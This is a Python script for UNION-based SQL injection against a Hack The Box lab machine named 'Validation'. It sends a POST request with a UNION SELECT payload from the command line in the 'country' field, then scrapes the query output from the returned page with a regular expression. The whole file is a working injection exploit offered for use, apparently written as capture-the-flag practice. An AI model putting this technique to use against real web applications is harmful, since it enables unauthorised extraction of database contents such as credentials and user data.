#!/usr/bin/python3
import requests
import re
import argparse
# SQL Injection script for HTB Validation machine

def parse_arguments():
    """
    Get arguments from user
    """
    parser = argparse.ArgumentParser(description="Parse command-line arguments.")

    parser.add_argument("injection", type=str, help="The name of the file to process")
    return parser.parse_args()


def sql_injection(injection: str):
    """
    SQL Injection for HTB Validation machine
    """
    url = "http://10.10.11.116:80/" # IP Target
    cookies = {"user": "ae2b1fca515949e5d54fb22b8ed95575"} # Random session
    # Some headers
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
               "Accept-Language": "en-US,en;q=0.5", 
               "Accept-Encoding": "gzip, deflate, br", 
               "Content-Type": "application/x-www-form-urlencoded", 
               "Origin": "http://10.10.11.116", 
               "DNT": "1", 
               "Connection": "close", 
               "Referer": "http://10.10.11.116/", 
               "Upgrade-Insecure-Requests": "1"}
    # Payload
    data = {"username": "testing", 
            "country": f"' union select {injection}-- -"}
    # Make request with SQL Injection
    r = requests.post(url, headers=headers, cookies=cookies, data=data)
    # Use regular expressions to match the desired output
    pattern = r"<li class='text-white'>(.*?)</li>"
    match = re.search(pattern, r.text, re.DOTALL)
    # Print the output (if there is one)
    if match:
        print(f"[+] Injection input: {injection}")
        print(f"[+] Injection output:\n{match.group(1).strip()}")
    else:
        print("[-] No text/output found.")


def main()->None:
    args: argparse.Namespace = parse_arguments()
    sql_injection(args.injection)


if __name__ == "__main__":
    main()
